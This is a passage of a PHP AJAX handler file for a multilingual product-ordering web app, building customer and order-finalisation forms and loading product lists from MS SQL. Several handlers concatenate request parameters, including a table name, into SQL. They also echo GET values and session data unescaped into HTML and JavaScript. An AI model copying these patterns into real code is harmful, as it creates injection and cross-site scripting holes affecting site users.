$get_data.=' onchange=parent.prepare_customer_data(); id=reg_value20 name=reg_value20 default_value="" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT country FROM [dbo].[120_country] ORDER BY country";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1[0].'" ';
            if (@$_SESSION["customer_info"][20]){
                if ($_SESSION["customer_info"][20]==@$row1["data_type"]){$get_data.=' selected=selected ';} 
            } 
            $get_data.=' > '.@$row1[0].'</option>';
        }
$get_data.='</select>

</span>
</td>
</tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("shipping",$_SESSION["language"]).': </span>
</td><td style="align:left;height:22px;" ><span>
<select onchange=parent.prepare_customer_data(); name=reg_value11 id=reg_value11 style="border:0px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT * FROM [dbo].[100_shipping_type] ORDER BY sequence";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1["data_type"].'" ';
            if (@$_SESSION["customer_info"][11]){
                if ($_SESSION["customer_info"][11]==@$row1["data_type"]){$get_data.=' selected=selected ';} 
            }else {
                if ($row["shipping"]==@$row1["data_type"] ) {$get_data.=' selected=selected ';}
            } 
            $get_data.=' > '.dictionary(@$row1["data_type"],$_SESSION["language"]).'</option>';    
        }
$get_data.='</select>
</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][21].'" id=reg_value21 name=reg_value21 type=text default_value="'.dictionary("phone",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("payment_terms",$_SESSION["language"]).': </span></td><td style="align:left;" ><span>
<select onchange=parent.prepare_customer_data(); name=reg_value12 id=reg_value12 style="color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT * FROM [dbo].[100_payment_terms] ORDER BY sequence";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1["data_type"].'" ';
            if (@$_SESSION["customer_info"][12]){
                if ($_SESSION["customer_info"][12]==@$row1["data_type"]){$get_data.=' selected=selected ';} 
            }else {
                if ($row["payment_terms"]==@$row1["data_type"] ) {$get_data.=' selected=selected ';}
            } 
            $get_data.=' > '.dictionary(@$row1["data_type"],$_SESSION["language"]).'</option>';    
        }
$get_data.='</select></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][22].'" id=reg_value22 name=reg_value22 type=text default_value="'.dictionary("email",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>

<tr><td colspan=5 style="height:10px;" ></td></tr>
<tr><td style="width:684px;" colspan=5 >
<div style="width:100%;color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("merchant_note",$_SESSION["language"]).': </div>
<textarea onchange=parent.prepare_customer_data(); id=reg_value13 name=reg_value13 style="width:100%;overflow:auto;height:70px" wrap=off >'.str_replace("<br />","\n",$_SESSION["customer_info"][13]).'</textarea>
</td></tr>


</table>
</div> 
<span style="position:absolute;top:9px;left:329px" ><span disabled=disabled title="'.dictionary("demand_step_1",$_SESSION["language"]).'" id=finalize_demand_step1  style="width:90px;height:30px;padding-top:8px;margin-top:0px;cursor:pointer;background: url(./images/demand_start_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" onmouseout=document.getElementById("finalize_demand_step1").style.background="url(\"./images/demand_start_off.png\")";document.getElementById("finalize_demand_step1").style.color="black"; onmouseover=document.getElementById("finalize_demand_step1").style.background="url(\"./images/demand_start_on.png\")";document.getElementById("finalize_demand_step1").style.color="white"; onclick=parent.prepare_customer_data();parent.check_demand_step("1"); >'.dictionary("demand_step_1",$_SESSION["language"]).'</span><span disabled=disabled title="'.dictionary("demand_step_2",$_SESSION["language"]).'" id=finalize_demand_step2  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-16px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_on.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;color:white;" onclick=parent.prepare_customer_data();parent.check_demand_step("2"); >'.dictionary("demand_step_2",$_SESSION["language"]).'</span><span disabled=disabled title="'.dictionary("demand_step_3",$_SESSION["language"]).'" id=finalize_demand_step3  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" onmouseout=document.getElementById("finalize_demand_step3").style.background="url(\"./images/demand_next_off.png\")";document.getElementById("finalize_demand_step3").style.color="black"; onmouseover=document.getElementById("finalize_demand_step3").style.background="url(\"./images/demand_next_on.png\")";document.getElementById("finalize_demand_step3").style.color="white"; onclick=parent.prepare_customer_data();parent.check_demand_step("3"); >'.dictionary("demand_step_3",$_SESSION["language"]).'</span><span disabled=disabled title="'.dictionary("demand_step_4",$_SESSION["language"]).'" id=finalize_demand_step4  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" >'.dictionary("demand_step_4",$_SESSION["language"]).'</span></span>
';
 echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 
 </style>
 
 
 </head><body style="width:100%;height:100%;padding:0px;margin:8px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;" >'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script><script>parent.prepare_customer_data();</script></html>';      
    
}







if (@$_GET["finalize_demand"] == 1 ){
    require_once ("./config/mssql_dbconnect.php");
    $data.="<div id='request_form' style='font-weight: bold;font-size:18px;font-family: verdana;color:black;' >".dictionary('finalize_demand',@$_SESSION["language"])."</div><p></p>";
    $data.="<div style='position: absolute; left: 10px; top: 80px'>
     <table style='width:684px;font-weight: bold;font-size:10px;font-family: verdana;color:black;'>";
    //$data.="<form id='demand_form' method='post' enctype='multipart/form-data' >";
    //label

    if (@$_SESSION["global_discount"]<>0){$price_column_description=dictionary("price_after_discount",@$_SESSION["language"]);}
        else {$price_column_description=dictionary("price",@$_SESSION["language"]);
        }
    
    $data.="<tr style='vertical-align:bottom;text-align:center;'>
    <td style='width:30px;'>".dictionary("nr",@$_SESSION["language"])."</td>
    <td colspan=2 style='width:140px;'>".dictionary("catalogue_number",@$_SESSION["language"])."</td>
    <td style='width:140px;'>".dictionary("size",@$_SESSION["language"])."</td>
    <td style='width:54px;' >".dictionary("measurement_unit",@$_SESSION["language"])."</td>
    <td style='width:54px;'>".dictionary("quantity",@$_SESSION["language"])."</td>
    <td style='width:80px;'>".$price_column_description."</td>
    <td style='width:32px;'></td>
    <td style='width:80px;'>".dictionary("total_price",@$_SESSION["language"])."</td>
    <td style='width:40px;'>".dictionary("cancel",@$_SESSION["language"])."</td>
    </tr>";
    
    // end of label
    
    //to reading field cycle
    $total_amount=0;$total_VAT_amount=0;
    $cykl=0;while(@$_SESSION["product"][$cykl]):
    if (@$_SESSION["global_discount"]<>0){$final_line_price=@$_SESSION["product"][$cykl][4];
    $final_unit_price=@$_SESSION["product"][$cykl][3];}
        else {$final_line_price=@$_SESSION["product"][$cykl][2];$final_unit_price=@$_SESSION["product"][$cykl][12];
        }
     
    //dataline
        $data.="<tr style='vertical-align:bottom;' id=1_count_".$cykl." >
        <td style='text-align:center;vertical-align:middle;'><a href=''; onclick='parent.window_change();parent.targeting_selected_unit(\"".$cykl."\");' style='cursor:pointer;' title='".dictionary("open_this_product",$_SESSION["language"])."' >".($cykl+1).".</a></td>
        <td colspan=2 style='text-align:left;'><input readonly=yes id=".$cykl."_demand_value1 name=".$cykl."_demand_value1 value='".@$_SESSION["product"][$cykl][7]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value5 name=".$cykl."_demand_value5 value='".@$_SESSION["product"][$cykl][10]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;' ><input readonly=yes id=".$cykl."_demand_value2 name=".$cykl."_demand_value2 value='".@$_SESSION["product"][$cykl][9]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input onchange=parent.calculate_line_sum('".$cykl."',this.value,'FINAL'); id=".$cykl."_demand_value3 onclick=select(); name=".$cykl."_demand_value3 value='".@$_SESSION["product"][$cykl][1]."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value4 name=".$cykl."_demand_value4 value='".$final_unit_price."' type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;' ></td>
        <td style='text-align:center;'></td>
        <td style='text-align:center;'><input readonly=yes id=".$cykl."_demand_value6 value='".@$final_line_price."' name=".$cykl."_demand_value6 type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;' ></td>
        <td style='text-align:right;'><img id='del_btn_".($cykl+1)."' src='./images/cancel.png' width='23px' height='23px' onmouseout=document.getElementById('del_btn_".($cykl+1)."').src='./images/cancel.png'; onmouseover=document.getElementById('del_btn_".($cykl+1)."').src='./images/delete.png'; style=cursor:pointer; onclick='delete_item_panel(\"".$cykl."\",\"".($cykl+1)." - ".@$_SESSION["product"][$cykl][7]."\",\"FINAL\");'  ></td>
        </tr>
        <tr style='vertical-align:bottom;' id=2_count_".$cykl." ><td colspan=2 style='width:95px;text-align:left;vertical-align:middle;'>".dictionary("note",@$_SESSION["language"])."</td>
        <td colspan=8 style='text-align:center;' ><input onchange=parent.note_change('".$cykl."',this.value,'FINAL'); id=".$cykl."_demand_value7 name=".$cykl."_demand_value7 value='".@$_SESSION["product"][$cykl][24]."' type=text style='width:100%;height:22px;border:0px;text-align:left;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_595_22.png) top left no-repeat;' ></td>
        </tr><tr id=3_count_".$cykl." ><td colspan=10><p style=height:10px;margin:0px;></p></td></tr>";
        //array for control
//        $data.="<tr><td colspan=10 >";
//        for ( $temp_cycle=0 ; isset($_SESSION["product"][$cykl][$temp_cycle]); $temp_cycle++){
//            $data.=@$_SESSION["product"][$cykl][$temp_cycle].":";    
//        }
//        $data.="</td></tr>";
        // end of control array
         
    // end of dataline
        $total_amount=$total_amount+$final_line_price;
        $total_VAT_amount=$total_VAT_amount+$final_line_price;

    $cykl++;endwhile;
        $data.="</table>
 <div style='width:100%;height:10px;' > </div>
         <div style='width:100%;color:black;font-weight:bold;font-size:16px;font-family:verdana;' >
         <hr style='width:100%;' >
         <span style='width:315px;text-align:left;' >".dictionary("total_demand_price",$_SESSION["language"])."</span><span style='width:189px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;' >".dictionary("total_demand_price_no_vat",$_SESSION["language"])."</span><span style='width:40px;' > </span><span style='width:140px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;' >".dictionary("total_demand_price_vat",$_SESSION["language"])."</span>
         <span style='width:315px;text-align:left;' > </span><span style='width:189px;text-aling:center;' ><input readonly=YES id=total_demand_amount type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_180_22.png) top left no-repeat;' value='".@$total_amount." ".@$_SESSION["Currency_Id"]."' ></span><span style='width:40px;' > </span><span style='width:140px;text-align:center;' ><input readonly=YES id=total_VAT_demand_amount type=text style='width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;' value='".@$total_VAT_amount." ".@$_SESSION["Currency_Id"]."' ></span>
         </div>        
        </div>
         <span style='position:absolute;top:8px;left:224px' ><img id=demand_reload src=./images/reload_off.png style=width:22px;height:22px;vertical-align:top;margin-top:1px;cursor:pointer; onmouseout=document.getElementById('demand_reload').src='./images/reload_off.png'; onmouseover=document.getElementById('demand_reload').src='./images/reload_on.png'; onclick=parent.calculate_global_discount(document.getElementById('global_discount').value,'FINAL'); >
         
<span style=width:5px; ></span><input id=global_discount type=text onchange=parent.calculate_global_discount(this.value,'FINAL'); onclick=select(); value='";
        if (@$_SESSION["global_discount"]<>0){$data.=@$_SESSION["global_discount"]."%";} else{$data.=dictionary("discount",@$_SESSION["language"]);}         
         
        
         $data.="' style='font-weight:normal;font-size:12px;font-family: arial;padding-top:4px;border:0px;width:60px;height:22px;cursor:pointer;text-align:center;background: url(./images/input_60_22.png) top left repeat;' onclick=select() ></span><span style='position:absolute;top:9px;left:329px' ><span disabled=disabled title='".dictionary("demand_step_1",$_SESSION["language"])."' id=finalize_demand_step1  style='width:90px;height:30px;padding-top:8px;margin-top:0px;cursor:pointer;background: url(./images/demand_start_on.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;color:white;' onclick=parent.check_demand_step('1'); >".dictionary("demand_step_1",$_SESSION["language"])."</span><span disabled=disabled title='".dictionary("demand_step_2",$_SESSION["language"])."' id=finalize_demand_step2  style='width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-16px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;' onmouseout=document.getElementById('finalize_demand_step2').style.background='url(\'./images/demand_next_off.png\')';document.getElementById('finalize_demand_step2').style.color='black'; onmouseover=document.getElementById('finalize_demand_step2').style.background='url(\'./images/demand_next_on.png\')';document.getElementById('finalize_demand_step2').style.color='white'; onclick=parent.check_demand_step('2'); >".dictionary("demand_step_2",$_SESSION["language"])."</span><span disabled=disabled title='".dictionary("demand_step_3",$_SESSION["language"])."' id=finalize_demand_step3  style='width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;' onmouseout=document.getElementById('finalize_demand_step3').style.background='url(\'./images/demand_next_off.png\')';document.getElementById('finalize_demand_step3').style.color='black'; onmouseover=document.getElementById('finalize_demand_step3').style.background='url(\'./images/demand_next_on.png\')';document.getElementById('finalize_demand_step3').style.color='white'; onclick=parent.check_demand_step('3'); >".dictionary("demand_step_3",$_SESSION["language"])."</span><span disabled=disabled title='".dictionary("demand_step_4",$_SESSION["language"])."' id=finalize_demand_step4  style='width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;' >".dictionary("demand_step_4",$_SESSION["language"])."</span></span>";
        
     echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
     
      <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 </style>
 </head><body style="width:100%;height:100%;padding:0px;margin:8px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;" >'.$data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script><script>parent.check_demand_step("CHECK");</script></html>

';   
}








if (isset($_GET["check_demand_step"])){
$data="function_result = true;
       var frame1_target = document.getElementById('program_body');
        try{ 
            frame1_target.contentWindow.document.getElementById('finalize_demand_step1').disabled=true;
            frame1_target.contentWindow.document.getElementById('finalize_demand_step2').disabled=true;
            frame1_target.contentWindow.document.getElementById('finalize_demand_step3').disabled=true;
            } catch ( e ){
            }
        ";
        

    if (@$_GET["check_demand_step"]=="CHECK"){
    
    //Step 1     
        if (!@$_SESSION["product"][0]) {
            require_once ("./config/mssql_dbconnect.php");
            @$sql_load =  "SELECT systemname FROM dbo.[100_main_setting] where data_type = 'app_url' ";
            @$checking = sqlsrv_query( $conn, $sql_load , $params, $options );@$url = sqlsrv_fetch_array( @$checking, SQLSRV_FETCH_BOTH );

            $data.="
        try{ 
            parent.document.location.href='".@$url[0]."';
            function_result = false;
            } catch ( e ){
            }
            ";} else {
            $data.="
        try{ 
            frame1_target.contentWindow.document.getElementById('finalize_demand_step1').disabled=false;
            frame1_target.contentWindow.document.getElementById('finalize_demand_step2').disabled=false;
            } catch ( e ){
            }
            ";                
            }
    //End of step 1
    
    //Step 2
        $clk=1;while ($clk < 23):

//        $data.="alert('".$clk." / ".@$_SESSION['customer_info'][@$clk]."');";
        
        if ((@$_SESSION['customer_info'][@$clk]=="" || !@$_SESSION['customer_info'][@$clk] ) && (@$clk<13 || @$_SESSION['customer_info'][0]=="on") && @$clk<>13 ){
            $data.="
            try{
            function_result = false;";
            if (@$clk<>13){$data.="
              frame1_target.contentWindow.document.getElementById('reg_value".$clk."').style.background='url(\"./images/yellow_219_22.png\")';
            ";}
            $data.="
            } catch ( e ){
            }
            ";
        } else {if (@$clk<>13){$data.="
            try{
            frame1_target.contentWindow.document.getElementById('finalize_demand_step2').disabled=false;
            frame1_target.contentWindow.document.getElementById('reg_value".$clk."').style.background='url(\"./images/input_219_22.png\")'; 
            } catch ( e ){
            }
            ";
               }
        }
        $clk++;endwhile;
    //End of Step 2
    
    
    // Step 3
    $data.="
    try{
        if (function_result=== true ) {
            frame1_target.contentWindow.document.getElementById('finalize_demand_step3').disabled=false;
        } else {frame1_target.contentWindow.document.getElementById('finalize_demand_step3').disabled=true;
                frame1_target.contentWindow.document.getElementById('finalize_demand_step4').disabled=true;
        }
            } catch ( e ){
            }
    ";
    
    
    // End of Step 3
    
    } else 
    {
        $data.="
        parent.finalize_demand('".@$_GET["check_demand_step"]."');";
    }
echo $data;
}








if (isset($_GET["load_present_list"])){
     require_once ("./config/mssql_dbconnect.php");
     $temp_language =explode("_",$_SESSION["language"]);$temp_language='ckeditor_'.$temp_language[1];  

     @$sql =  "SELECT ".mssecuresql($temp_language)." FROM dbo.[100_main_setting] WHERE [data_type] = 'product_list_header' ";
     @$check = sqlsrv_query( $conn, $sql , $params, $options );
     @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
     @$get_data='<SPAN style="text-align:center;width:100%;color:black;font-weight:bold;font-size:22px;font-family:verdana;" >'.str_replace("\r\n","",@$row[0]).'</SPAN>';

     @$sql =  "SELECT [data_type] FROM  dbo.[100_nomenclature_group] ORDER BY [parent_data_type],[sequence] ASC";
     @$check = sqlsrv_query( $conn, $sql , $params, $options );
     
     $cycle=0;
     while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
         $get_data.='<iframe type=text/html src="./ajax_functions.php?load_present_unit='.$row[0].'" style="width:491px;height:370px;cursor:pointer;opacity:0.5;filter:alpha(opacity=50);frameBorder:1;" frameBorder=1 onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.5;this.filters.alpha.opacity=50" ></iframe>';
         $cycle++;
     }
     if (($cycle/2) <> (round($cycle/2,0))){
        $get_data.='<iframe type=text/html style="width:491px;height:370px;cursor:pointer;opacity:0.5;filter:alpha(opacity=50);frameBorder:1;" frameBorder=1 ></iframe><hr style=position:relative;top:-18px;/>';        
     }
     
 if (@$get_data){
    echo "parent.document.getElementById('present_leaflet').innerHTML='".@$get_data."<hr>';";
 }
}



if (isset($_GET["load_present_unit"])){
     require_once ("./config/mssql_dbconnect.php");
     $temp_language =explode("_",$_SESSION["language"]);$temp_language='ckeditor_'.$temp_language[1];  
     @$sql =  "SELECT nomen.".mssecuresql($temp_language).",nomen.id,prod_group.id FROM  dbo.[100_nomenclature_group] nomen,dbo.[100_product_group] prod_group WHERE nomen.parent_data_type = prod_group.data_type and nomen.data_type ='".mssecuresql($_GET["load_present_unit"])."' ";
     //program_log($sql,'delete','sql.log');     
     @$check = sqlsrv_query( $conn, $sql , $params, $options );
    @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
    if (sqlsrv_num_fields($check)){
        if (@$row[0]<>""){
                echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;zoom:0.7;cursor:pointer;" ondblclick="parent.main_menu_select(\'main_panel_menu_none\');parent.enable_items(\'\');parent.fn_on_off_display(\'submenu'.@$row[2].'\');parent.fn_group_image(\''.@$row[2].'\');parent.document.getElementById(\'submenu_item'.@$row[2].'-'.@$row[1].'\').className = \'product_in\';parent.load_datalist(\'100_nomenclature_group\',\''.@$row[1].'\');parent.sel_prod(\''.$_GET["load_present_unit"].'\');parent.enable_models(\''.$_GET["load_present_unit"].'\',\'MENU\');parent.document.getElementById(\'full_page\').style.display=\'none\';" >'.str_replace("<a href","<a href disabled=disabled ",$row[0]).'</body></html>';
        }
    }
}







if (isset($_GET["load_datalist"])){
    $_SESSION["last_datalist"]=$_GET["load_datalist"].":+:".$_GET["table"].":+:".$_GET["nomen"];
    require_once ("./config/mssql_dbconnect.php");
    $temp_language =explode("_",$_SESSION["language"]);$temp_language='ckeditor_'.$temp_language[1];  
    
    if ($_GET["table"]=="100_model"){
        @$sql =  "SELECT model.".mssecuresql($temp_language)." FROM  dbo.[100_nomenclature_group] nomen, dbo.[100_model] model WHERE nomen.data_type = model.parent_data_type AND nomen.id = '".mssecuresql($_GET["nomen"])."' AND model.data_type like '".mssecuresql($_GET["load_datalist"])."_%' ";
        } else {@$sql =  "SELECT ".mssecuresql($temp_language)." FROM dbo.[".mssecuresql($_GET["table"])."] where id = '".mssecuresql($_GET["load_datalist"])."' ";
        }
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
    //program_log($sql,'delete','sql.log');

    if (sqlsrv_num_fields($check)){
        if (@$row[0]<>""){
                echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script></head><body style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$row[0].'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html>';
        }
    }
}









if (isset($_GET["contact_us"])){
  require_once ("./modules/captcha/securimage-send.php");
  $img = new Securimage();
  $valid = $img->check(decode($_GET["contact_us"]));
  if($valid == true) {echo "alert('hi');";}
}








if (isset($_GET["language_panel"])){
    $language_panel="document.getElementById('language_panel').innerHTML='";
    $selected_language="";
    require_once ("./config/mssql_dbconnect.php");
        @$sql =  "SELECT * FROM dbo.[100_dictionary] where systemname like 'lang[_]%' ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        $language_panel.="<image src=./ajax_functions.php?icon=YES&tbl=".code("100_dictionary")."&id=".code($row[0])." ";
            if ($_GET["language_panel"] == $row[3]){
                $selected_language="editor_language = \"".$row[3]."\";";
                $language_panel.=" class=\"language_on\" onclick=load_editor_data(\"".$row[3]."\"); "; }
                else { $language_panel.=" class=\"language_off\" onclick=load_editor_data(\"".$row[3]."\"); onmouseout=className=\"language_off\"; onmouseover=className=\"language_on\"; "; }
        $language_panel.="> ";     
    }
    
    echo $selected_language;
    echo @$language_panel."';";
}












if (isset($_GET["ckedit"])){
    $data_language = explode ("_" ,$_GET["data_language"]);
    $data_language = "ckeditor_".$data_language[1];
    require_once ("./config/mssql_dbconnect.php");
